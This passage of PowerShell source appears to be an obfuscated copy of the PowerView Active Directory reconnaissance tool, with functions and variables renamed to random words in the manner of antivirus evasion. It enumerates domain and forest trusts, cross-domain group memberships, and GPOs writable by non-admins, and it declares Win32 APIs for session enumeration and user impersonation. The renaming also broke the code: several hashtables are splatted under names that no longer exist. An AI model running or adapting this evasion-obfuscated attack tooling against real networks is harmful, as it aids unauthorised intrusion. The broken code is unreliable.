                $edZYFiQh99 = $NcasgAYU99::GetSize()

                for ($i = 0; ($i -lt $VdcPSFws99); $i++) {
                    $VhLegEcR99 = New-Object System.Intptr -ArgumentList $edhaIdNu99
                    $Info = $VhLegEcR99 -as $NcasgAYU99

                    $edhaIdNu99 = $VhLegEcR99.ToInt64()
                    $edhaIdNu99 += $edZYFiQh99

                    $TVijPzgJ99 = ''
                    $BSvRtRei99 = $PLdufbge99::ConvertSidToStringSid($Info.DomainSid, [ref]$TVijPzgJ99);$BxwMoRfM99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                    if ($BSvRtRei99 -eq 0) {
                        Write-Verbose "[flounder] Error: $(([ComponentModel.Win32Exception] $BxwMoRfM99).Message)"
                    }
                    else {
                        $acXsZsNW99 = New-Object PSObject
                        $acXsZsNW99 | Add-Member Noteproperty 'SourceName' $zvvelQNm99
                        $acXsZsNW99 | Add-Member Noteproperty 'TargetName' $Info.DnsDomainName
                        $acXsZsNW99 | Add-Member Noteproperty 'TargetNetbiosName' $Info.NetbiosDomainName
                        $acXsZsNW99 | Add-Member Noteproperty 'Flags' $Info.Flags
                        $acXsZsNW99 | Add-Member Noteproperty 'ParentIndex' $Info.ParentIndex
                        $acXsZsNW99 | Add-Member Noteproperty 'TrustType' $Info.TrustType
                        $acXsZsNW99 | Add-Member Noteproperty 'TrustAttributes' $Info.TrustAttributes
                        $acXsZsNW99 | Add-Member Noteproperty 'TargetSid' $TVijPzgJ99
                        $acXsZsNW99 | Add-Member Noteproperty 'TargetGuid' $Info.DomainGuid
                        $acXsZsNW99.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.API')
                        $acXsZsNW99
                    }
                }
                $Null = $lXLOcMXI99::NetApiBufferFree($mAzkenkf99)
            }
            else {
                Write-Verbose "[flounder] Error: $(([ComponentModel.Win32Exception] $BSvRtRei99).Message)"
            }
        }
        else {
            $iFQIsXeq99 = philately @NetSearcherArguments
            if ($iFQIsXeq99) {
                $iFQIsXeq99.GetAllTrustRelationships() | ForEach-Object {
                    $_.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.NET')
                    $_
                }
            }
        }
    }
}


function Dorset {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForestTrust.NET')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $CGeRkdBE99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $xFFwQvQC99 = @{}
        if ($PSBoundParameters['Forest']) { $xFFwQvQC99['Forest'] = $CGeRkdBE99 }
        if ($PSBoundParameters['Credential']) { $xFFwQvQC99['Credential'] = $ZiReXCQu99 }

        $TpakdaGA99 = presumably @NetForestArguments

        if ($TpakdaGA99) {
            $TpakdaGA99.GetAllTrustRelationships() | ForEach-Object {
                $_.PSObject.TypeNames.Insert(0, 'PowerView.ForestTrust.NET')
                $_
            }
        }
    }
}


function intravenouses {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForeignUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $XQOKQXGr99,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $RUtJqxpA99,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $kaLEgole99,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $leCQEaFf99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $VmSwBdTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $YtWADKZe99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $JYnIcwBJ99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $fEdVcXRd99,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $iKRjUkvW99,

        [Switch]
        $uomKXjrL99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $xfOIjAld99 = @{}
        $xfOIjAld99['LDAPFilter'] = '(memberof=*)'
        if ($PSBoundParameters['Domain']) { $xfOIjAld99['Domain'] = $XQOKQXGr99 }
        if ($PSBoundParameters['Properties']) { $xfOIjAld99['Properties'] = $kaLEgole99 }
        if ($PSBoundParameters['SearchBase']) { $xfOIjAld99['SearchBase'] = $leCQEaFf99 }
        if ($PSBoundParameters['Server']) { $xfOIjAld99['Server'] = $VmSwBdTN99 }
        if ($PSBoundParameters['SearchScope']) { $xfOIjAld99['SearchScope'] = $YtWADKZe99 }
        if ($PSBoundParameters['ResultPageSize']) { $xfOIjAld99['ResultPageSize'] = $JYnIcwBJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $xfOIjAld99['ServerTimeLimit'] = $fEdVcXRd99 }
        if ($PSBoundParameters['SecurityMasks']) { $xfOIjAld99['SecurityMasks'] = $iKRjUkvW99 }
        if ($PSBoundParameters['Tombstone']) { $xfOIjAld99['Tombstone'] = $uomKXjrL99 }
        if ($PSBoundParameters['Credential']) { $xfOIjAld99['Credential'] = $ZiReXCQu99 }
        if ($PSBoundParameters['Raw']) { $xfOIjAld99['Raw'] = $Raw }
    }

    PROCESS {
        bobcats @SearcherArguments  | ForEach-Object {
            ForEach ($iIxmpuxj99 in $_.memberof) {
                $Index = $iIxmpuxj99.IndexOf('DC=')
                if ($Index) {

                    $rmBBqKQq99 = $($iIxmpuxj99.SubString($Index)) -replace 'DC=','' -replace ',','.'
                    $DZcUFPMn99 = $_.distinguishedname
                    $vKpkPKbt99 = $DZcUFPMn99.IndexOf('DC=')
                    $tpoFORKS99 = $($_.distinguishedname.SubString($vKpkPKbt99)) -replace 'DC=','' -replace ',','.'

                    if ($rmBBqKQq99 -ne $tpoFORKS99) {
                        $nVmmyinF99 = $iIxmpuxj99.Split(',')[0].split('=')[1]
                        $UZXNsBAx99 = New-Object PSObject
                        $UZXNsBAx99 | Add-Member Noteproperty 'UserDomain' $tpoFORKS99
                        $UZXNsBAx99 | Add-Member Noteproperty 'UserName' $_.samaccountname
                        $UZXNsBAx99 | Add-Member Noteproperty 'UserDistinguishedName' $_.distinguishedname
                        $UZXNsBAx99 | Add-Member Noteproperty 'GroupDomain' $rmBBqKQq99
                        $UZXNsBAx99 | Add-Member Noteproperty 'GroupName' $nVmmyinF99
                        $UZXNsBAx99 | Add-Member Noteproperty 'GroupDistinguishedName' $iIxmpuxj99
                        $UZXNsBAx99.PSObject.TypeNames.Insert(0, 'PowerView.ForeignUser')
                        $UZXNsBAx99
                    }
                }
            }
        }
    }
}


function lethargy {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForeignGroupMember')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $XQOKQXGr99,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $RUtJqxpA99,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $kaLEgole99,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $leCQEaFf99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $VmSwBdTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $YtWADKZe99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $JYnIcwBJ99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $fEdVcXRd99,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $iKRjUkvW99,

        [Switch]
        $uomKXjrL99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $xfOIjAld99 = @{}
        $xfOIjAld99['LDAPFilter'] = '(member=*)'
        if ($PSBoundParameters['Domain']) { $xfOIjAld99['Domain'] = $XQOKQXGr99 }
        if ($PSBoundParameters['Properties']) { $xfOIjAld99['Properties'] = $kaLEgole99 }
        if ($PSBoundParameters['SearchBase']) { $xfOIjAld99['SearchBase'] = $leCQEaFf99 }
        if ($PSBoundParameters['Server']) { $xfOIjAld99['Server'] = $VmSwBdTN99 }
        if ($PSBoundParameters['SearchScope']) { $xfOIjAld99['SearchScope'] = $YtWADKZe99 }
        if ($PSBoundParameters['ResultPageSize']) { $xfOIjAld99['ResultPageSize'] = $JYnIcwBJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $xfOIjAld99['ServerTimeLimit'] = $fEdVcXRd99 }
        if ($PSBoundParameters['SecurityMasks']) { $xfOIjAld99['SecurityMasks'] = $iKRjUkvW99 }
        if ($PSBoundParameters['Tombstone']) { $xfOIjAld99['Tombstone'] = $uomKXjrL99 }
        if ($PSBoundParameters['Credential']) { $xfOIjAld99['Credential'] = $ZiReXCQu99 }
        if ($PSBoundParameters['Raw']) { $xfOIjAld99['Raw'] = $Raw }
    }

    PROCESS {
        $RwMuMMmM99 = @('Users', 'Domain Users', 'Guests')

        grownup @SearcherArguments | Where-Object { $RwMuMMmM99 -notcontains $_.samaccountname } | ForEach-Object {
            $nVmmyinF99 = $_.samAccountName
            $RWqAlLsJ99 = $_.distinguishedname
            $rmBBqKQq99 = $RWqAlLsJ99.SubString($RWqAlLsJ99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'

            $_.member | ForEach-Object {
                $fWOeDubU99 = $_.SubString($_.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                if (($_ -match 'CN=S-1-5-21.*-.*') -or ($rmBBqKQq99 -ne $fWOeDubU99)) {
                    $aYbTwQYm99 = $_
                    $ebkBXIst99 = $_.Split(',')[0].split('=')[1]

                    $CbsJFhdn99 = New-Object PSObject
                    $CbsJFhdn99 | Add-Member Noteproperty 'GroupDomain' $rmBBqKQq99
                    $CbsJFhdn99 | Add-Member Noteproperty 'GroupName' $nVmmyinF99
                    $CbsJFhdn99 | Add-Member Noteproperty 'GroupDistinguishedName' $RWqAlLsJ99
                    $CbsJFhdn99 | Add-Member Noteproperty 'MemberDomain' $fWOeDubU99
                    $CbsJFhdn99 | Add-Member Noteproperty 'MemberName' $ebkBXIst99
                    $CbsJFhdn99 | Add-Member Noteproperty 'MemberDistinguishedName' $aYbTwQYm99
                    $CbsJFhdn99.PSObject.TypeNames.Insert(0, 'PowerView.ForeignGroupMember')
                    $CbsJFhdn99
                }
            }
        }
    }
}


function librarians {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DomainTrust.NET')]
    [OutputType('PowerView.DomainTrust.LDAP')]
    [OutputType('PowerView.DomainTrust.API')]
    [CmdletBinding(DefaultParameterSetName = 'LDAP')]
    Param(
        [Parameter(ParameterSetName = 'API')]
        [Switch]
        $API,

        [Parameter(ParameterSetName = 'NET')]
        [Switch]
        $NET,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $RUtJqxpA99,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $kaLEgole99,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $leCQEaFf99,

        [Parameter(ParameterSetName = 'LDAP')]
        [Parameter(ParameterSetName = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $VmSwBdTN99,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $YtWADKZe99 = 'Subtree',

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $JYnIcwBJ99 = 200,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $fEdVcXRd99,

        [Parameter(ParameterSetName = 'LDAP')]
        [Switch]
        $uomKXjrL99,

        [Parameter(ParameterSetName = 'LDAP')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty
    )

    $ytLPqojh99 = @{}

    $UJwzvDAv99 = New-Object System.Collections.Stack

    $XWeguIld99 = @{}
    if ($PSBoundParameters['API']) { $XWeguIld99['API'] = $API }
    if ($PSBoundParameters['NET']) { $XWeguIld99['NET'] = $NET }
    if ($PSBoundParameters['LDAPFilter']) { $XWeguIld99['LDAPFilter'] = $RUtJqxpA99 }
    if ($PSBoundParameters['Properties']) { $XWeguIld99['Properties'] = $kaLEgole99 }
    if ($PSBoundParameters['SearchBase']) { $XWeguIld99['SearchBase'] = $leCQEaFf99 }
    if ($PSBoundParameters['Server']) { $XWeguIld99['Server'] = $VmSwBdTN99 }
    if ($PSBoundParameters['SearchScope']) { $XWeguIld99['SearchScope'] = $YtWADKZe99 }
    if ($PSBoundParameters['ResultPageSize']) { $XWeguIld99['ResultPageSize'] = $JYnIcwBJ99 }
    if ($PSBoundParameters['ServerTimeLimit']) { $XWeguIld99['ServerTimeLimit'] = $fEdVcXRd99 }
    if ($PSBoundParameters['Tombstone']) { $XWeguIld99['Tombstone'] = $uomKXjrL99 }
    if ($PSBoundParameters['Credential']) { $XWeguIld99['Credential'] = $ZiReXCQu99 }

    if ($PSBoundParameters['Credential']) {
        $CRhhofvK99 = (philately -ZiReXCQu99 $ZiReXCQu99).Name
    }
    else {
        $CRhhofvK99 = (philately).Name
    }
    $UJwzvDAv99.Push($CRhhofvK99)

    while($UJwzvDAv99.Count -ne 0) {

        $XQOKQXGr99 = $UJwzvDAv99.Pop()

        if ($XQOKQXGr99 -and ($XQOKQXGr99.Trim() -ne '') -and (-not $ytLPqojh99.ContainsKey($XQOKQXGr99))) {

            Write-Verbose "[librarians] Enumerating trusts for domain: '$XQOKQXGr99'"

            $Null = $ytLPqojh99.Add($XQOKQXGr99, '')

            try {
                $XWeguIld99['Domain'] = $XQOKQXGr99
                $BCTOqIhZ99 = flounder @DomainTrustArguments

                if ($BCTOqIhZ99 -isnot [System.Array]) {
                    $BCTOqIhZ99 = @($BCTOqIhZ99)
                }

                if ($PsCmdlet.ParameterSetName -eq 'NET') {
                    $jsTXORtb99 = @{}
                    if ($PSBoundParameters['Forest']) { $jsTXORtb99['Forest'] = $CGeRkdBE99 }
                    if ($PSBoundParameters['Credential']) { $jsTXORtb99['Credential'] = $ZiReXCQu99 }
                    $BCTOqIhZ99 += Dorset @ForestTrustArguments
                }

                if ($BCTOqIhZ99) {
                    if ($BCTOqIhZ99 -isnot [System.Array]) {
                        $BCTOqIhZ99 = @($BCTOqIhZ99)
                    }

                    ForEach ($Trust in $BCTOqIhZ99) {
                        if ($Trust.SourceName -and $Trust.TargetName) {
                            $Null = $UJwzvDAv99.Push($Trust.TargetName)
                            $Trust
                        }
                    }
                }
            }
            catch {
                Write-Verbose "[librarians] Error: $_"
            }
        }
    }
}


function legroom {

    [CmdletBinding()]
    Param (
        [String]
        $JyqWlBxr99 = '*',

        [ValidateRange(1,10000)] 
        [Int]
        $RzbusakB99 = 200
    )

    $gzLRYrux99 = @('SYSTEM','Domain Admins','Enterprise Admins')

    $CGeRkdBE99 = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
    $BXkchbSQ99 = @($CGeRkdBE99.Domains)
    $UJwzvDAv99 = $BXkchbSQ99 | foreach { $_.GetDirectoryEntry() }
    foreach ($XQOKQXGr99 in $UJwzvDAv99) {
        $cqPynTGG99 = "(&(objectCategory=groupPolicyContainer)(displayname=$JyqWlBxr99))"
        $lASAYQeR99 = New-Object System.DirectoryServices.DirectorySearcher
        $lASAYQeR99.SearchRoot = $XQOKQXGr99
        $lASAYQeR99.Filter = $cqPynTGG99
        $lASAYQeR99.PageSize = $RzbusakB99
        $lASAYQeR99.SearchScope = "Subtree"
        $glXrdXOC99 = $lASAYQeR99.FindAll()
        foreach ($gpo in $glXrdXOC99){
            $ACL = ([ADSI]$gpo.path).ObjectSecurity.Access | ? {$_.ActiveDirectoryRights -match "Write" -and $_.AccessControlType -eq "Allow" -and  $gzLRYrux99 -notcontains $_.IdentityReference.toString().split("\")[1] -and $_.IdentityReference -ne "CREATOR OWNER"}
        if ($ACL -ne $null){
            $BiNlqDzk99 = New-Object psobject
            $BiNlqDzk99 | Add-Member Noteproperty 'ADSPath' $gpo.Properties.adspath
            $BiNlqDzk99 | Add-Member Noteproperty 'GPODisplayName' $gpo.Properties.displayname
            $BiNlqDzk99 | Add-Member Noteproperty 'IdentityReference' $ACL.IdentityReference
            $BiNlqDzk99 | Add-Member Noteproperty 'ActiveDirectoryRights' $ACL.ActiveDirectoryRights
            $BiNlqDzk99
        }
        }
    }
}



$Mod = Darwin -ModuleName Win32


$HtWQATiZ99 = foreleg $Mod PowerView.SamAccountTypeEnum UInt32 @{
    DOMAIN_OBJECT                   =   '0x00000000'
    GROUP_OBJECT                    =   '0x10000000'
    NON_SECURITY_GROUP_OBJECT       =   '0x10000001'
    ALIAS_OBJECT                    =   '0x20000000'
    NON_SECURITY_ALIAS_OBJECT       =   '0x20000001'
    USER_OBJECT                     =   '0x30000000'
    MACHINE_ACCOUNT                 =   '0x30000001'
    TRUST_ACCOUNT                   =   '0x30000002'
    APP_BASIC_GROUP                 =   '0x40000000'
    APP_QUERY_GROUP                 =   '0x40000001'
    ACCOUNT_TYPE_MAX                =   '0x7fffffff'
}

$XweWpMuH99 = foreleg $Mod PowerView.GroupTypeEnum UInt32 @{
    CREATED_BY_SYSTEM               =   '0x00000001'
    GLOBAL_SCOPE                    =   '0x00000002'
    DOMAIN_LOCAL_SCOPE              =   '0x00000004'
    UNIVERSAL_SCOPE                 =   '0x00000008'
    APP_BASIC                       =   '0x00000010'
    APP_QUERY                       =   '0x00000020'
    SECURITY                        =   '0x80000000'
} -Bitfield

$CaGOukxX99 = foreleg $Mod PowerView.UACEnum UInt32 @{
    SCRIPT                          =   1
    ACCOUNTDISABLE                  =   2
    HOMEDIR_REQUIRED                =   8
    LOCKOUT                         =   16
    PASSWD_NOTREQD                  =   32
    PASSWD_CANT_CHANGE              =   64
    ENCRYPTED_TEXT_PWD_ALLOWED      =   128
    TEMP_DUPLICATE_ACCOUNT          =   256
    NORMAL_ACCOUNT                  =   512
    INTERDOMAIN_TRUST_ACCOUNT       =   2048
    WORKSTATION_TRUST_ACCOUNT       =   4096
    SERVER_TRUST_ACCOUNT            =   8192
    DONT_EXPIRE_PASSWORD            =   65536
    MNS_LOGON_ACCOUNT               =   131072
    SMARTCARD_REQUIRED              =   262144
    TRUSTED_FOR_DELEGATION          =   524288
    NOT_DELEGATED                   =   1048576
    USE_DES_KEY_ONLY                =   2097152
    DONT_REQ_PREAUTH                =   4194304
    PASSWORD_EXPIRED                =   8388608
    TRUSTED_TO_AUTH_FOR_DELEGATION  =   16777216
    PARTIAL_SECRETS_ACCOUNT         =   67108864
} -Bitfield

$NsLEtYVv99 = foreleg $Mod WTS_CONNECTSTATE_CLASS UInt16 @{
    Active       =    0
    Connected    =    1
    ConnectQuery =    2
    Shadow       =    3
    Disconnected =    4
    Idle         =    5
    Listen       =    6
    Reset        =    7
    Down         =    8
    Init         =    9
}

$wUHYqIqu99 = exculpated $Mod PowerView.RDPSessionInfo @{
    ExecEnvId = field 0 UInt32
    State = field 1 $NsLEtYVv99
    SessionId = field 2 UInt32
    pSessionName = field 3 String -MarshalAs @('LPWStr')
    pHostName = field 4 String -MarshalAs @('LPWStr')
    pUserName = field 5 String -MarshalAs @('LPWStr')
    pDomainName = field 6 String -MarshalAs @('LPWStr')
    pFarmName = field 7 String -MarshalAs @('LPWStr')
}

$iFVJfScA99 = exculpated $mod WTS_CLIENT_ADDRESS @{
    AddressFamily = field 0 UInt32
    Address = field 1 Byte[] -MarshalAs @('ByValArray', 20)
}

$SDnRYmAJ99 = exculpated $Mod PowerView.ShareInfo @{
    Name = field 0 String -MarshalAs @('LPWStr')
    Type = field 1 UInt32
    Remark = field 2 String -MarshalAs @('LPWStr')
}

$zqkPfqMa99 = exculpated $Mod PowerView.LoggedOnUserInfo @{
    UserName = field 0 String -MarshalAs @('LPWStr')
    LogonDomain = field 1 String -MarshalAs @('LPWStr')
    AuthDomains = field 2 String -MarshalAs @('LPWStr')
    LogonServer = field 3 String -MarshalAs @('LPWStr')
}

$sUCccQvP99 = exculpated $Mod PowerView.SessionInfo @{
    CName = field 0 String -MarshalAs @('LPWStr')
    UserName = field 1 String -MarshalAs @('LPWStr')
    Time = field 2 UInt32
    IdleTime = field 3 UInt32
}

$MLuofMyx99 = foreleg $Mod SID_NAME_USE UInt16 @{
    SidTypeUser             = 1
    SidTypeGroup            = 2
    SidTypeDomain           = 3
    SidTypeAlias            = 4
    SidTypeWellKnownGroup   = 5
    SidTypeDeletedAccount   = 6
    SidTypeInvalid          = 7
    SidTypeUnknown          = 8
    SidTypeComputer         = 9
}

$puBxSgQL99 = exculpated $Mod LOCALGROUP_INFO_1 @{
    lgrpi1_name = field 0 String -MarshalAs @('LPWStr')
    lgrpi1_comment = field 1 String -MarshalAs @('LPWStr')
}

$hfwCzFNt99 = exculpated $Mod LOCALGROUP_MEMBERS_INFO_2 @{
    lgrmi2_sid = field 0 IntPtr
    lgrmi2_sidusage = field 1 $MLuofMyx99
    lgrmi2_domainandname = field 2 String -MarshalAs @('LPWStr')
}

$DsDomainFlag = foreleg $Mod DsDomain.Flags UInt32 @{
    IN_FOREST       = 1
    DIRECT_OUTBOUND = 2
    TREE_ROOT       = 4
    PRIMARY         = 8
    NATIVE_MODE     = 16
    DIRECT_INBOUND  = 32
} -Bitfield
$gOMmUTKi99 = foreleg $Mod DsDomain.TrustType UInt32 @{
    DOWNLEVEL   = 1
    UPLEVEL     = 2
    MIT         = 3
    DCE         = 4
}
$EGXYaemn99 = foreleg $Mod DsDomain.TrustAttributes UInt32 @{
    NON_TRANSITIVE      = 1
    UPLEVEL_ONLY        = 2
    FILTER_SIDS         = 4
    FOREST_TRANSITIVE   = 8
    CROSS_ORGANIZATION  = 16
    WITHIN_FOREST       = 32
    TREAT_AS_EXTERNAL   = 64
}

$NcasgAYU99 = exculpated $Mod DS_DOMAIN_TRUSTS @{
    NetbiosDomainName = field 0 String -MarshalAs @('LPWStr')
    DnsDomainName = field 1 String -MarshalAs @('LPWStr')
    Flags = field 2 $DsDomainFlag
    ParentIndex = field 3 UInt32
    TrustType = field 4 $gOMmUTKi99
    TrustAttributes = field 5 $EGXYaemn99
    DomainSid = field 6 IntPtr
    DomainGuid = field 7 Guid
}

$dECxWMht99 = exculpated $Mod NETRESOURCEW @{
    dwScope =         field 0 UInt32
    dwType =          field 1 UInt32
    dwDisplayType =   field 2 UInt32
    dwUsage =         field 3 UInt32
    lpLocalName =     field 4 String -MarshalAs @('LPWStr')
    lpRemoteName =    field 5 String -MarshalAs @('LPWStr')
    lpComment =       field 6 String -MarshalAs @('LPWStr')
    lpProvider =      field 7 String -MarshalAs @('LPWStr')
}

$FunctionDefinitions = @(
    (func netapi32 NetShareEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetWkstaUserEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetSessionEnum ([Int]) @([String], [String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetLocalGroupEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetLocalGroupGetMembers ([Int]) @([String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 DsGetSiteName ([Int]) @([String], [IntPtr].MakeByRefType())),
    (func netapi32 DsEnumerateDomainTrusts ([Int]) @([String], [UInt32], [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType())),
    (func netapi32 NetApiBufferFree ([Int]) @([IntPtr])),
    (func advapi32 ConvertSidToStringSid ([Int]) @([IntPtr], [String].MakeByRefType()) -SetLastError),
    (func advapi32 OpenSCManagerW ([IntPtr]) @([String], [String], [Int]) -SetLastError),
    (func advapi32 CloseServiceHandle ([Int]) @([IntPtr])),
    (func advapi32 LogonUser ([Bool]) @([String], [String], [String], [UInt32], [UInt32], [IntPtr].MakeByRefType()) -SetLastError),
    (func advapi32 ImpersonateLoggedOnUser ([Bool]) @([IntPtr]) -SetLastError),
    (func advapi32 RevertToSelf ([Bool]) @() -SetLastError),
    (func wtsapi32 WTSOpenServerEx ([IntPtr]) @([String])),
    (func wtsapi32 WTSEnumerateSessionsEx ([Int]) @([IntPtr], [Int32].MakeByRefType(), [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
    (func wtsapi32 WTSQuerySessionInformation ([Int]) @([IntPtr], [Int], [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
    (func wtsapi32 WTSFreeMemoryEx ([Int]) @([Int32], [IntPtr], [Int32])),
    (func wtsapi32 WTSFreeMemory ([Int]) @([IntPtr])),
    (func wtsapi32 WTSCloseServer ([Int]) @([IntPtr])),
    (func Mpr WNetAddConnection2W ([Int]) @($dECxWMht99, [String], [String], [UInt32])),
    (func Mpr WNetCancelConnection2 ([Int]) @([String], [Int], [Bool])),
    (func kernel32 CloseHandle ([Bool]) @([IntPtr]) -SetLastError)
)

$Types = $FunctionDefinitions | ravelled -Module $Mod -Namespace 'Win32'
$lXLOcMXI99 = $Types['netapi32']
$PLdufbge99 = $Types['advapi32']
$keCFwkfG99 = $Types['wtsapi32']
$Mpr = $Types['Mpr']
$Kernel32 = $Types['kernel32']
